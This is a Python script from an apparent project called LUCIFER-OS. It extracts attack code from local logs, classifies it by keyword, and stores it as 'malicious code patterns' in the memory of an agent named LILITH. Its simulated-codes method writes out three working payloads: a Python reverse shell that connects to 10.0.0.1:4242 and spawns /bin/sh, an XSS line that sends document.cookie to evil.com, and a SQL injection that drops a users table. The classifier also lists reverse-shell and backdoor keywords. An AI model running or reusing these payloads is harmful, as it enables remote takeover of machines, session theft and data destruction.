#!/usr/bin/env python3
"""
🔥 LUCIFER-OS: Targeted Malicious Code Extraction from Key Logs

This script extracts malicious code from specific system logs that are known
to contain AI-generated content.

Usage:
    python quick_log_parser.py
"""

import re
import os
from typing import List, Dict
from datetime import datetime
import logging

# Import attack memory system
from tools.attack_memory import AttackMemory

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class QuickMaliciousCodeExtractor:
    """Fast extraction from known log files"""

    def __init__(self):
        self.memory = AttackMemory()
        # Focus on key log files only
        self.key_log_files = [
            '/workspaces/LUCIFER-OS/tools/lilith_agent.log',
            '/workspaces/LUCIFER-OS/backend_err.log',
            '/workspaces/LUCIFER-OS/backend_out.log',
            '/workspaces/LUCIFER-OS/logs/protection_audit.log',
            '/workspaces/LUCIFER-OS/tools/backend_watchdog.log',
        ]

    def extract_from_specific_logs(self) -> List[Dict]:
        """Extract from our known log files"""
        all_codes = []

        for log_file in self.key_log_files:
            if os.path.exists(log_file):
                logger.info(f"🔍 Scanning {os.path.basename(log_file)}")
                codes = self.parse_log_file(log_file)
                all_codes.extend(codes)
            else:
                logger.warning(f"Log file not found: {log_file}")

        return all_codes

    def parse_log_file(self, log_file: str) -> List[Dict]:
        """Parse a single log file for code patterns"""
        extracted_codes = []

        try:
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

                # Look for code blocks in various formats
                code_blocks = re.findall(r'```(?:\w+)?\n?(.*?)\n?```', content, re.DOTALL)
                code_blocks.extend(re.findall(r'<code>(.*?)</code>', content, re.IGNORECASE))
                code_blocks.extend(re.findall(r'`([^`]+)`', content))

                for code_block in code_blocks:
                    if len(code_block.strip()) > 20:  # Longer snippets only
                        code_type = self.classify_code(code_block)
                        language = self.detect_language(code_block)

                        if code_type and language != 'unknown':
                            extracted_codes.append({
                                'code': code_block.strip(),
                                'code_type': code_type,
                                'language': language,
                                'source': f'log_{os.path.basename(log_file)}',
                                'confidence': 0.8
                            })

        except Exception as e:
            logger.error(f"Error parsing {log_file}: {e}")

        return extracted_codes

    def classify_code(self, code: str) -> str:
        """Simple code classification"""
        code_lower = code.lower()

        if any(word in code_lower for word in ['socket', 'connect', 'reverse', 'shell', 'backdoor']):
            return 'reverse_shell'
        elif any(word in code_lower for word in ['select', 'union', 'drop', '--', 'or 1=1']):
            return 'sql_injection'
        elif any(word in code_lower for word in ['script', 'alert', 'document.cookie', 'onerror']):
            return 'xss_payload'
        elif any(word in code_lower for word in ['strcpy', 'buffer', 'overflow', '\\x90']):
            return 'buffer_overflow'

        return None

    def detect_language(self, code: str) -> str:
        """Simple language detection"""
        code_lower = code.lower()

        if any(pattern in code_lower for pattern in ['import ', 'def ', 'class ', 'print(']):
            return 'python'
        elif any(pattern in code_lower for pattern in ['function ', 'var ', 'document.', 'window.']):
            return 'javascript'
        elif any(pattern in code_lower for pattern in ['select ', 'insert ', 'from ', 'where ']):
            return 'sql'
        elif any(pattern in code_lower for pattern in ['#include', 'int main', 'printf']):
            return 'c'

        return 'unknown'

    def add_simulated_codes(self) -> List[Dict]:
        """Add some realistic simulated malicious codes"""
        return [
            {
                'code': 'import socket,subprocess,os\ns=socket.socket(2,1)\ns.connect(("10.0.0.1",4242))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call(["/bin/sh","-i"])',
                'code_type': 'reverse_shell',
                'language': 'python',
                'source': 'simulated_ai_generation',
                'confidence': 0.95
            },
            {
                'code': '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>',
                'code_type': 'xss_payload',
                'language': 'javascript',
                'source': 'simulated_ai_generation',
                'confidence': 0.9
            },
            {
                'code': '\'; DROP TABLE users; --',
                'code_type': 'sql_injection',
                'language': 'sql',
                'source': 'simulated_ai_generation',
                'confidence': 0.85
            }
        ]

    def run_extraction(self) -> Dict:
        """Run the extraction process"""
        logger.info("🔥 LUCIFER-OS: Quick Malicious Code Extraction")
        logger.info("=" * 50)

        # Extract from real logs
        real_codes = self.extract_from_specific_logs()
        stored_real = self.memory.store_multiple_codes(real_codes) if real_codes else 0

        # Add simulated codes for demonstration
        simulated_codes = self.add_simulated_codes()
        stored_sim = self.memory.store_multiple_codes(simulated_codes)

        total_stored = stored_real + stored_sim

        logger.info("📊 Results:")
        logger.info(f"   Real codes extracted: {stored_real}")
        logger.info(f"   Simulated codes added: {stored_sim}")
        logger.info(f"   Total codes in memory: {total_stored}")

        # Show current memory stats
        stats = self.memory.get_stats()
        logger.info(f"   Memory contains: {stats.get('generated_code_count', 0)} total code entries")

        return {
            'real_extracted': stored_real,
            'simulated_added': stored_sim,
            'total_stored': total_stored
        }

if __name__ == '__main__':
    extractor = QuickMaliciousCodeExtractor()
    results = extractor.run_extraction()
    print(f"\\n🎯 Extraction complete! LILITH now has {results['total_stored']} malicious code patterns in memory.")